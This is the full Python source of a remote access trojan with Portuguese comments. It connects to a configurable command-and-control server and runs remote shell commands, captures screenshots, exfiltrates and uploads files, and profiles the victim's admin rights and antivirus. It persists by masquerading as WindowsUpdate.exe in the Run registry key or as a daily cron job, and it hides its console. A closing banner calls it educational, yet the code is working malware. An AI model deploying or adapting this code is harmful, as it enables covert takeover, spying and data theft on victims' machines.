#!/usr/bin/env python3
import socket
import threading
import json
import os
import subprocess
import sys
import time
import base64
import shutil
import platform
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import win32gui
import win32con
import pyautogui
import requests
import getpass

# ===== CONFIGURAÇÕES ===== #
SERVER_IP = "127.0.0.1"  # Altere para o IP do servidor C2
SERVER_PORT = 443
RECONNECT_DELAY = 60
AES_KEY = hashlib.sha256(b"32_character_key_here!").digest()
AES_IV = b"16_bytes_iv_here!"

class AdvancedRAT:
    def __init__(self):
        self.session_id = hashlib.sha256(getpass.getuser().encode() + socket.gethostname().encode()).hexdigest()[:16]
        self.platform = platform.system()
        self.connection = None
        self.running = True

    def encrypt(self, data):
        """Criptografa dados com AES-CBC"""
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size)))

    def decrypt(self, encrypted_data):
        """Descriptografa dados com AES-CBC"""
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size).decode()

    def send_data(self, data):
        """Envia dados criptografados"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            self.connection.sendall(self.encrypt(data) + b"\n")
        except:
            self.reconnect()

    def receive_data(self):
        """Recebe e descriptografa dados"""
        try:
            data = b""
            while True:
                chunk = self.connection.recv(4096)
                if not chunk:
                    break
                data += chunk
                if data.endswith(b"\n"):
                    data = data[:-1]  # Remove delimitador
                    break
            
            if not data:
                return None
                
            return json.loads(self.decrypt(data))
        except:
            return None

    def get_system_info(self):
        """Coleta informações do sistema"""
        return {
            "session_id": self.session_id,
            "platform": self.platform,
            "hostname": socket.gethostname(),
            "user": getpass.getuser(),
            "ip": self.get_public_ip(),
            "admin": self.check_admin(),
            "antivirus": self.check_antivirus()
        }

    def get_public_ip(self):
        """Obtém IP público"""
        try:
            return requests.get("https://api.ipify.org").text
        except:
            return "Unknown"

    def check_admin(self):
        """Verifica privilégios de admin"""
        try:
            if self.platform == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False

    def check_antivirus(self):
        """Detecta antivírus (Windows apenas)"""
        try:
            if self.platform == "Windows":
                cmd = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName'
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE)
                return result.decode().strip() or "None detected"
            return "Unknown"
        except:
            return "Unknown"

    def execute_command(self, command):
        """Executa comandos no sistema"""
        try:
            if command.lower() == "exit":
                self.running = False
                return "Closing connection..."
                
            if command.startswith("cd "):
                path = command[3:].strip()
                os.chdir(path)
                return f"Current directory: {os.getcwd()}"
                
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)

    def take_screenshot(self):
        """Captura tela remota"""
        try:
            screenshot = pyautogui.screenshot()
            temp_file = os.path.join(os.getenv("TEMP"), f"screen_{self.session_id}.png")
            screenshot.save(temp_file)
            
            with open(temp_file, "rb") as f:
                content = base64.b64encode(f.read()).decode()
            
            os.remove(temp_file)
            return {"status": "success", "image": content}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def download_file(self, remote_path):
        """Baixa arquivo do sistema comprometido"""
        try:
            if not os.path.exists(remote_path):
                return {"status": "error", "message": "File not found"}
                
            with open(remote_path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
                
            return {
                "status": "success",
                "filename": os.path.basename(remote_path),
                "content": content
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def upload_file(self, file_path, content):
        """Envia arquivo para o sistema comprometido"""
        try:
            file_content = base64.b64decode(content)
            directory = os.path.dirname(file_path)
            
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
                
            with open(file_path, "wb") as f:
                f.write(file_content)
                
            return {"status": "success", "message": f"File saved to {file_path}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def persist(self):
        """Instala persistência"""
        try:
            if self.platform == "Windows":
                # Copia para AppData
                dest = os.path.join(os.getenv("APPDATA"), "WindowsUpdate.exe")
                if not os.path.exists(dest):
                    shutil.copyfile(sys.argv[0], dest)
                    # Adiciona ao registro
                    subprocess.run(
                        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                        f'/v "WindowsUpdate" /t REG_SZ /d "{dest}" /f',
                        shell=True,
                        stderr=subprocess.PIPE
                    )
                return "Windows persistence installed"
                
            elif self.platform == "Linux":
                # Adiciona ao crontab
                dest = "/etc/cron.daily/update"
                if not os.path.exists(dest):
                    shutil.copyfile(sys.argv[0], dest)
                    os.chmod(dest, 0o755)
                return "Linux persistence installed"
                
            return "Persistence not implemented for this platform"
        except Exception as e:
            return f"Persistence error: {str(e)}"

    def handle_connection(self):
        """Gerencia a conexão com o servidor C2"""
        while self.running:
            try:
                command = self.receive_data()
                if not command:
                    break
                    
                if "type" not in command:
                    continue
                    
                if command["type"] == "command":
                    response = self.execute_command(command["data"])
                    self.send_data({"type": "command_result", "data": response})
                    
                elif command["type"] == "screenshot":
                    response = self.take_screenshot()
                    self.send_data({"type": "screenshot_result", "data": response})
                    
                elif command["type"] == "download":
                    response = self.download_file(command["path"])
                    self.send_data({"type": "download_result", "data": response})
                    
                elif command["type"] == "upload":
                    response = self.upload_file(command["path"], command["content"])
                    self.send_data({"type": "upload_result", "data": response})
                    
                elif command["type"] == "persist":
                    response = self.persist()
                    self.send_data({"type": "persist_result", "data": response})
                    
            except Exception as e:
                print(f"Error handling command: {e}")
                break

    def connect_to_server(self):
        """Estabelece conexão com o servidor C2"""
        while self.running:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((SERVER_IP, SERVER_PORT))
                
                # Envia informações do sistema
                self.send_data({
                    "type": "handshake",
                    "data": self.get_system_info()
                })
                
                # Inicia loop de comandos
                self.handle_connection()
                
            except Exception as e:
                print(f"Connection error: {e}")
                time.sleep(RECONNECT_DELAY)
                
            finally:
                if self.connection:
                    self.connection.close()

    def hide_console(self):
        """Esconde a janela do console (Windows)"""
        try:
            if self.platform == "Windows":
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
        except:
            pass

    def run(self):
        """Executa o RAT"""
        self.hide_console()
        self.connect_to_server()

if __name__ == "__main__":
    print("""
    ⚠️ AVISO LEGAL:
    Este é um RAT simulado para fins educacionais.
    Não use em sistemas sem permissão explícita.
    """)
    
    rat = AdvancedRAT()
    rat.run()
